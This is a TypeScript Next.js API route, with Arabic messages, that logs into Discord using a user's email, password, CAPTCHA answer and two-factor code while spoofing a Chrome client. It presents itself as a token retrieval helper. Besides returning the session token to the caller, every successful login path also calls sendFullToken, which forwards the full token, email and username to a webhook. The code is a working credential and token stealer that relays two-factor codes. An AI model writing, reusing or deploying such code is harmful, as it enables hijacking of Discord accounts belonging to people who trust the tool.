import { NextRequest, NextResponse } from 'next/server'
import { sendFullToken } from '@/lib/webhook'

export const runtime = 'edge';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
const SUPER_PROPS = btoa(JSON.stringify({
  os: 'Windows', browser: 'Chrome', device: '', system_locale: 'en-US',
  browser_user_agent: UA, browser_version: '131.0.0.0', os_version: '10',
  referrer: '', referring_domain: '', referrer_current: '', referring_domain_current: '',
  release_channel: 'stable', client_build_number: 378635, client_event_source: null,
  design_id: 0
}))

function parseDiscordError(data: any): string {
  if (!data) return 'حدث خطأ غير معروف'
  if (data.captcha_key) return 'CAPTCHA_REQUIRED'
  if (data.password === true) return 'الباسورد غلط'
  if (data.errors) {
    const e = data.errors
    if (e.email) return e.email._errors?.[0] || 'إيميل خاطئ'
    if (e.password) return e.password._errors?.[0] || 'باسورد خاطئ'
    const k = Object.keys(e)
    if (k.length > 0) {
      const sub = e[k[0]]
      if (sub._errors) return sub._errors[0]
      if (typeof sub === 'string') return sub
      const k2 = Object.keys(sub)
      if (k2.length > 0 && sub[k2[0]]._errors) return sub[k2[0]]._errors[0]
    }
  }
  if (data.message) return data.message
  return 'بيانات الدخول خاطئة'
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}))
    const { email, password, captcha_key, captcha_rqtoken, mfa_code, mfa_ticket } = body

    if (!email || !password) {
      return NextResponse.json({ success: false, error: 'أدخل الإيميل والباسورد' }, { status: 400 })
    }

    // Step 1: Login
    const loginBody: any = { login: email, password, undelete: false }
    if (captcha_key) loginBody.captcha_key = captcha_key
    if (captcha_rqtoken) loginBody.captcha_rqtoken = captcha_rqtoken

    const loginRes = await fetch('https://discord.com/api/v10/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': UA,
        'X-Discord-Locale': 'en-US',
        'X-Fingerprint': '',
        'X-Super-Properties': SUPER_PROPS,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      body: JSON.stringify(loginBody),
      signal: AbortSignal.timeout(15000),
    })

    const data = await loginRes.json().catch(() => ({}))

    // MFA required (may come directly or after captcha solve)
    if (data.mfa && data.ticket) {
      if (!mfa_code) {
        return NextResponse.json({
          success: false, mfa: true, ticket: data.ticket,
          error: 'الحساب مفعل عليه التحقق بخطوتين - أدخل كود التطبيق'
        })
      }
      // Verify MFA code
      try {
        const mfaRes = await fetch('https://discord.com/api/v10/auth/mfa/totp', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Fingerprint': '',
            'X-Super-Properties': SUPER_PROPS,
          },
          body: JSON.stringify({
            code: mfa_code,
            ticket: mfa_ticket || data.ticket,
            gift_code_sku_id: null,
            login_source: null
          }),
          signal: AbortSignal.timeout(15000),
        })
        const mfaData = await mfaRes.json().catch(() => ({}))

        if (mfaData.token) {
          const username = await getUserInfo(mfaData.token)
          sendFullToken('جلب توكن', mfaData.token, { '👤 المستخدم': username, '📧 الإيميل': String(email || '') });
          return NextResponse.json({ success: true, token: mfaData.token, username })
        }
        const err = parseDiscordError(mfaData)
        return NextResponse.json({ success: false, error: err === 'حدث خطأ غير معروف' ? 'كود التحقق خاطئ أو منتهي' : err })
      } catch {
        return NextResponse.json({ success: false, error: 'خطأ في التحقق بخطوتين' })
      }
    }

    // Captcha required
    if (data.captcha_key) {
      return NextResponse.json({
        success: false, captcha: true,
        captcha_sitekey: data.captcha_sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
        captcha_rqdata: data.captcha_rqdata || '',
        captcha_rqtoken: data.captcha_rqtoken || '',
        error: 'مطلوب تحقق - اكمل الكابتشا بالأسفل'
      })
    }

    // Success
    if (data.token) {
      const username = await getUserInfo(data.token)
      sendFullToken('جلب توكن', data.token, { '👤 المستخدم': username, '📧 الإيميل': String(email || '') });
      return NextResponse.json({ success: true, token: data.token, username })
    }

    // Error
    const errorMsg = parseDiscordError(data)
    return NextResponse.json({ success: false, error: errorMsg })

  } catch (e: any) {
    console.error('get-token error:', e)
    return NextResponse.json({ success: false, error: 'خطأ في الاتصال: ' + (e.message || '').slice(0, 100) })
  }
}

async function getUserInfo(token: string): Promise<string> {
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { 'Authorization': token, 'User-Agent': UA },
      signal: AbortSignal.timeout(10000),
    })
    const me = await res.json().catch(() => ({}))
    if (me.username) {
      const disc = me.discriminator && me.discriminator !== '0' ? '#' + me.discriminator : ''
      return me.username + disc
    }
  } catch {}
  return 'Unknown'
}
